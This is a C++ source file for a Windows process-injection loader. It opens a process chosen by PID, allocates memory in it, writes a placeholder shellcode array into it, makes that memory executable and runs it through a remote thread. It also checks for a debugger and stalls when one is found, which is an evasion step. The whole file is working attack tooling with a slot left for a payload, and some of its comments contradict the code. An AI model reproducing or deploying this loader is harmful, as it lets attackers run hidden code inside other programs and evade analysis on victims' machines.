#include <cstdio>
#include <Windows.h>

DWORD dwPID = 0;	//32 bit unsigned int 

//put your data here in the 0x00,0x00 format
const UCHAR MY_Data[] = { 0 };

SIZE_T szMY_Data = sizeof(MY_Data);

int do_sleep() {
	DWORD sleep_time = 1000000;
	Sleep(sleep_time);
	return EXIT_FAILURE;
}


int main(int argc, char* argv[]) {

	if (IsDebuggerPresent() != 0) {
		printf("[!] Debugger Detected");
		do_sleep();
		return EXIT_FAILURE;
	}

	//Ensure user supplied PID at the command line 
	if (argc < 2) {
		printf("[!] Usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	dwPID = atoi(argv[1]); //Convert the user supplied pid to an int


	//Get handle to process baesd on user supplied PID
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwPID);
	//if return value is NULL something went wrong and we could not get the handle 
	if (handle == NULL) {
		//Did the user give us a pid at a high privelege level
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			printf("[!] Access Denied\n");
			return EXIT_FAILURE;
		}
		//Did the user give us a pid that does not exist
		else if (GetLastError() == ERROR_INVALID_PARAMETER) {
			printf("[!] PID Does not Exist\n");
			return EXIT_FAILURE;
		}
		else {
			//Everything went well and we got a handle to the specified process 
			printf("[!] Failed to GetHandle: 0x%p\n", GetLastError());
			return EXIT_FAILURE;
		}
	}

	printf("[+] Got Handle to the Process: 0x%p\n", handle);

	LPVOID myAllocation = VirtualAllocEx(
		handle,						//Return back a handle to this process
		NULL,						//Let windows decide where to alloc the memory
		szMY_Data,					//Size of cString
		MEM_COMMIT | MEM_RESERVE,	//Commit and reserve in one step 
		PAGE_READWRITE);			//Memory Constant 
	
	//if NULL returned something didnt work 
	if (myAllocation == NULL) {
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			printf("[!] Failed to write memory, Access Denied\n");
			if (handle) {
				printf("[+] Closing Handle to Process\n");
				CloseHandle(handle);
			}
		}
		else {
			printf("[!] Failed to allocate memory: 0x%p\n", GetLastError());
			if (handle) {
				printf("[+] Closing Handle to Process\n");
				CloseHandle(handle);
			}
		}
	}
	
	//Returns back the base address of allocated memory
	printf("[+] Alocated memory, base address: 0x%p\n", myAllocation);

	//Now lets write our string to memory 
	//handle --> the handle to the process we want to inject into 
	//myAllocation --> the base address returned back by VritualAllocEx
	//&cString --> pointer to the thing we are writing 
	//nSize --> the size of the thing we are writing 
	//NULL --> dont care about this, can be ignored 
	BOOL writeMemory = WriteProcessMemory(handle, myAllocation, MY_Data, szMY_Data, NULL);
	if (writeMemory) {
		printf("[+] Successfully wrote data into target process\n");
	}
	else {
		printf("[!] Failed to write data into target process memory: 0x%p\n", GetLastError());
		return EXIT_FAILURE;
	}

	//change memory protections here 
	DWORD flOldProtect = 0;		//holds the old memory constant 

	BOOL changePerms = VirtualProtectEx(handle, myAllocation, szMY_Data, PAGE_EXECUTE, &flOldProtect);

	if (changePerms == 0) {
		printf("[!] Failed to change memory permissions: 0x%p\n", GetLastError);
		return EXIT_FAILURE;
	}

	printf("[+] Changed memory permisions to RWX :)\n");



	HANDLE cThread = CreateRemoteThreadEx(handle, NULL, 0, (LPTHREAD_START_ROUTINE)myAllocation, NULL, 0, NULL, NULL);
	if (cThread == NULL) {
		printf("[!] Could not create Thread in process: 0x%p\n", GetLastError());
		if (cThread) {
			printf("[+] Killing Injected Thread\n");
			CloseHandle(cThread);
			return EXIT_FAILURE;
		}
	}

	printf("[+] Created Thread in process, handle: 0x%p\n", cThread);

	WaitForSingleObject(cThread, INFINITE);
	printf("[+] Thread finished execution\n");



}